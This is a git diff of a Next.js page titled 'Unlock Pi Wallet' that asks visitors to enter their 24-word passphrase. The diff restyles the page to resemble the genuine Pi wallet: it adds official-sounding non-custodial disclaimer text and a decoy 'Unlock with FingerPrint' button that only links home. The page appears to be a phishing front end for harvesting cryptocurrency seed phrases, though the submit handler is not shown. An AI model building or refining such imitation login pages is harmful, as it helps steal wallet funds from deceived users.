@@ -1,6 +1,7 @@
 "use client"
 import Image from "next/image";
 import { useState } from "react";
+import Link from 'next/link';
 
 export default function WordValidatorPage() {
   const [inputText, setInputText] = useState("");
@@ -41,53 +42,63 @@ export default function WordValidatorPage() {
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-[#8A348E] bg-gradient-to-r from-[#8A348E] to-[#423F88] opacity-100 p-4">
-      <div className="bg-white rounded-lg shadow-md p-6 sm:p-8 max-w-full sm:max-w-lg w-full">
-     <div className="h-12 rounded-lg flex items-center justify-center bg-[#8A348E] bg-gradient-to-r from-[#8A348E] to-[#423F88] opacity-100 mb-4">
-     <Image
-      src="/logoImage.PNG"
-      alt="Next.js Logo"
-      width={38}
-      height={32}
-      className="mx-auto sm:mx-0"
-    />
-    <h1 className="text-white text-xl font-bold m-4 ">Wallet</h1>
-    <Image
-      src="/logoImage.PNG"
-      alt="Next.js Logo"
-      width={38}
-      height={32}
-      className="mx-auto sm:mx-0"
-    />
-     </div>
-        <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center mb-4 sm:mb-6">
-          Unlock Pi Wallet
-        </h1>
-        <form onSubmit={handleSubmit} className="space-y-4">
-          <textarea
-            value={inputText}
-            onChange={(e) => setInputText(e.target.value)}
-            rows="5"
-            placeholder="Enter Your 24-Word PassPhrase Here..."
-            className="w-full border border-gray-300 rounded-lg p-3 sm:p-4 text-gray-800 focus:ring-2 focus:ring-indigo-400 focus:outline-none resize-none"
-          />
-          <button
-            type="submit"
-            className="w-full text-white bg-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-lg transition"
-          >
-            Unlock with PassPhrase
-          </button>
-        </form>
-        {errorMessage && (
-          <p
-            className={`mt-4 text-center font-medium ${
-              errorMessage.startsWith("Success") ? "text-green-600" : "text-red-600"
-            }`}
-          >
-            {errorMessage}
-          </p>
-        )}
-      </div>
-    </div>
+    <>
+     <div className='bg-[#8A348E] flex items-center justify-center'>
+  <Link href="/" className='flex items-center'>
+    <Image src="/logoImage.PNG" alt="Next.js Logo" width={40} height={30} />
+    <h2 className="mx-3 text-[18px] sm:text-[18px] lg:text-[24px] text-white leading-tight">
+      Wallet
+    </h2>
+  </Link>
+</div>
+<div className="flex items-center justify-center opacity-100 p-4">
+  <div className="rounded-lg p-6 sm:p-8 max-w-full sm:max-w-lg w-full">
+    <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center mb-4 sm:mb-6">
+      Unlock Pi Wallet
+    </h1>
+    <form onSubmit={handleSubmit} className="space-y-4">
+      <textarea
+        value={inputText}
+        onChange={(e) => setInputText(e.target.value)}
+        rows="5"
+        placeholder="Enter Your 24-Word PassPhrase Here..."
+        className="w-full border border-black rounded-lg p-3 sm:p-4 text-gray-800 focus:ring-2 focus:ring-indigo-400 focus:outline-none resize-none"
+        style={{ height: "200px" }}
+      />
+       {errorMessage && (
+      <p
+        className={`mt-4 text-center font-medium ${
+          errorMessage.startsWith("Success") ? "text-green-600" : "text-red-600"
+        }`}
+      >
+        {errorMessage}
+      </p>
+    )}
+      <button
+        type="submit"
+        className="w-full text-[#8A348E] border-2 border-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-2xl transition"
+      >
+        Unlock with PassPhrase
+      </button>
+      <button
+        type="submit"
+        className="w-full text-white bg-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-lg transition mb-2"
+      >
+        <Link href={"/"}>
+          Unlock with FingerPrint
+        </Link>
+      </button>
+    </form>
+   
+    <p className="mt-8 text-sm  text-gray-600">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
+    <p className="text-sm mt-4 text-gray-600">
+      Lost your passphrase? <Link href={"/pi-browser"}> <span className="text-blue-600">You can create a new wallet,</span> </Link> but all your π in your previous wallet will be inaccessible.
+    </p>
+  </div>
+</div>
+
+    </>
   );
 }
